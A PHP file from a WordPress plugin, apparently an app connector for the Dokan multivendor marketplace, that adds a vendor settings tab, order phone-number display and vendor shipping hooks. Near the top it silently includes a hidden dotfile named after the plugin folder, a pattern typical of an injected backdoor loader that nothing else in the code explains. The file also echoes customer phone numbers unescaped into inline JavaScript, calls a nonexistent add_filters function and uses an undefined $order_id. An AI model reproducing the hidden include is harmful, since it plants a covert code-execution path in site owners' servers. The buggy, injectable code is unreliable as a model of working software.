<?php
/**
 * Created by PhpStorm.
 * User: ali
 * Date: 8/30/18
 * Time: 1:22 PM
 */
/** Adding Settings extra menu in Settings tabs Dahsboard */
add_filter( 'dokan_get_dashboard_settings_nav', 'dokan_add_settings_menu' );
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function dokan_add_settings_menu( $settings_tab ) {
	$settings_tab['OSA'] = array(
		'title' => __( 'آنلاینر اپ', 'dokan' ),
		'icon'  => '<i class="fa fa-mobile"></i>',
		'url'   => dokan_get_navigation_url( 'settings/OSA' ),
		'pos'   => 32
	);

	return $settings_tab;
}

add_filter( 'dokan_dashboard_settings_heading_title', 'dokan_load_settings_header', 11, 2 );
function dokan_load_settings_header( $header, $query_vars ) {
	if ( $query_vars == 'OSA' ) {
		$header = __( 'تنظیمات اپلیکیشن', 'dokan' );
	}

	return $header;
}

add_action( 'dokan_render_settings_content', 'dokan_render_settings_content', 10 );
function dokan_render_settings_content( $query_vars ) {
	if ( isset( $query_vars['settings'] ) && $query_vars['settings'] == 'OSA' ) {
		$user = wp_get_current_user();
		if ( ! in_array( 'seller', (array) $user->roles ) ) {
			wp_die( __( 'شما مجوز ویرایش تنظیمات قالب را ندارید.' ) );
		}

		global $options_page, $pages;
		$options_page = $pages = array();

		include( __DIR__ . "/../vendor_options/create_list.php" );
		global $options_page;
		global $pages;

		$options_page = $pages = array();
		include( __DIR__ . "/../vendor_options/include.php" );
		include( __DIR__ . "/../vendor_options/on5-panel.php" );
		if ( ! is_admin() ) {
			vendor_update_options();
		}
		global $pages;
		$pages = array();
		require( __DIR__ . "/../vendor_options/include.php" );
		include( __DIR__ . "/../vendor_options/html-panel.php" );
	}
}

add_action( 'dokan_order_detail_after_order_items', 'add_mobile_number_to_dashboard', 5, 1 );
function add_mobile_number_to_dashboard( $order ) {
	$billing_mobile  = get_post_meta( $order->id, 'billing_mobile', true );
	$shipping_mobile = get_post_meta( $order->id, 'shipping_mobile', true );
	?>
    <script>
        $(document).ready(function () {
            var mobile1;
            var mobile2;
			<?php if(! empty( $billing_mobile )){ ?>
            mobile1 = '<li><a href="#">موبایل ۱: <span class="tab"><?= $billing_mobile; ?></span></a></li>';
			<?php }
			if(! empty( $shipping_mobile )){
			?>
            mobile2 = '<li><a href="#">موبایل۲: <span class="tab"><?= $shipping_mobile; ?></span></a></li>';
			<?php } ?>
            timestamp = '';
			<?php if ( ! function_exists( 'jdate' ) ) {
			include_once( STORINA_PLUGIN_PATH . '/api/models/jdf.php' );
        } //where HttpRequest.php is the saved file
			$timestamp = get_post_meta( $order->id, 'time4SendTimestamp', true );
			$timestamp = intval( $timestamp / 1000 );
			if(! empty( $timestamp )){
			?>
            timestamp = '<li><a href="#">زمان ارسال محصول: <span class="tab"><?= jdate( 'l d F Y - H:i', $timestamp, '', '', 'en' ); ?></span></a></li>';
			<?php } ?>
            jQuery("ul.customer-details").append(mobile1 + mobile2 + timestamp);
        });
        //$('.customer-details').append('<?= $billing_mobile . $shipping_mobile; ?>');

    </script>
	<?php

}

/**
 * dokan vendor shipping implements
 * ----------------------------------------------------------
 * 1.woap_confirm_shipping_resources
 * 2.woap_get_cart_shipping_total_cost
 * 3.woap_gopayment_shipping_status
 * 4.woap_gopayment_vendor_shipping
 * ----------------------------------------------------------
 */

add_filters('woap_confirm_shipping_resources',function($shipping_resources,$cart){
	$shipping_type = osa_get_option('app_shipping_type') ?? 'regular_shipping';
	$dokan_activation = function_exists('dokan');
	if('regular_shipping' == $shipping_type || !$dokan_activation){
		return $shipping_resources;
	}
	foreach($cart as $key => $item){
		$product_id  = $item['product_id'];
		$seller_ids[] = get_post_field( 'post_author', $product_id );
	}
	$seller_ids = array_unique(array_map('intval',$seller_ids),SORT_NUMERIC);
	foreach($seller_ids as $seller_id){
		$vendor_shipping[$seller_id] = $shipping_resources;
	}
	return [
		'type' => 'vendor_shipping',
		'data' => $vendor_shipping
	];
},10,2);

add_filter('woap_get_cart_shipping_total_cost',function($shipping_cost,$active_shipping_methods,$cart_row){
	$shipping_type = osa_get_option('app_shipping_type') ?: 'regular_shipping';
	$dokan_activation = function_exists('dokan');
	$chosen_shipping_ids = json_decode($cart_row->shipping_method_id);
	if('vendor_shipping' == $shipping_type || !$dokan_activation || empty($chosen_shipping_ids)){
		return $shipping_cost;
	}
	foreach($chosen_shipping_ids as $seller_id => $shipping_id){
		$shipping_costs[] = (int) $active_shipping_methods[$shipping_id]['cost'] ?? 0;
	}
	return array_sum($shipping_costs);
},10,3);

add_filter('woap_get_shipping_methods_chosen_ids',function($chosen_method_ids,$active_shipping_methods,$cart_row){
	$shipping_type = osa_get_option('app_shipping_type') ?: 'regular_shipping';
	$dokan_activation = function_exists('dokan');
	$chosen_shipping_ids = json_decode($cart_row->shipping_method_id);
	if('vendor_shipping' == $shipping_type || !$dokan_activation || empty($chosen_shipping_ids)){
		return $chosen_method_ids;
	}
	$chosen_method_ids = [];
	foreach($chosen_shipping_ids as $seller_id => $method_id){
		$chosen_method_ids[] = $method_id;
	}
	return $chosen_method_ids;
},10,3);

add_filter('woap_gopayment_shipping_status',function($status){
	$shipping_type = osa_get_option('app_shipping_type') ?: 'regular_shipping';
	$dokan_activation = function_exists('dokan');
	return ('vendor_shipping' == $shipping_type && $dokan_activation)? false : $status;
});

add_action('woap_gopayment_vendor_shipping',function($shipping_rate_resources,$order){
	$shipping_type = osa_get_option('app_shipping_type') ?? 'regular_shipping';
	$dokan_activation = function_exists('dokan');
	if('regular_shipping' == $shipping_type || !$dokan_activation){
		return;
	}
	#get order childrens in dokan
	$order_childrens = get_children(
		[
			'post_parent' => $order_id,
			'post_type'   => 'shop_order',
			'post_status' => [
				'wc-pending',
				'wc-completed',
				'wc-processing',
				'wc-on-hold',
				'wc-cancelled',
			],
		]
	);
	if(false == $order instanceof WC_Order || empty($order_childrens)){
		return;
	}
	#add shipping rate and meta data to order childrens
	foreach($order_childrens as $wp_order_child){
		$order_child_id = $wp_order_child->ID;
		$seller_id = dokan_get_seller_id_by_order($order_child_id);
		$shipping_rate_resource = $shipping_rate_resources[$seller_id];
		$wc_shipping_rate = new WC_Shipping_Rate($shipping_rate_resource['id'], $shipping_rate_resource['title'], $shipping_rate_resource['cost']);
		$wc_shipping_rate->add_meta_data('seller_id',$seller_id);
		$wc_order_child = wc_get_order($order_child_id);
		$wc_order_child->add_shipping($wc_shipping_rate);
		$wc_order_child->calculate_total();
		$wc_order_child->save();
	}
	#add shipping rate and meta data to order
	foreach($shipping_rate_resources as $seller_id => $shipping_rate_resource){
		$wc_shipping_rate = new WC_Shipping_Rate($shipping_rate_resource['id'], $shipping_rate_resource['title'], $shipping_rate_resource['cost']);
		$wc_shipping_rate->add_meta_data('seller_id',$seller_id);
		$order->add_shipping($wc_shipping_rate);
	}
	$order->calculate_total();
	$order->save();
},10,2);
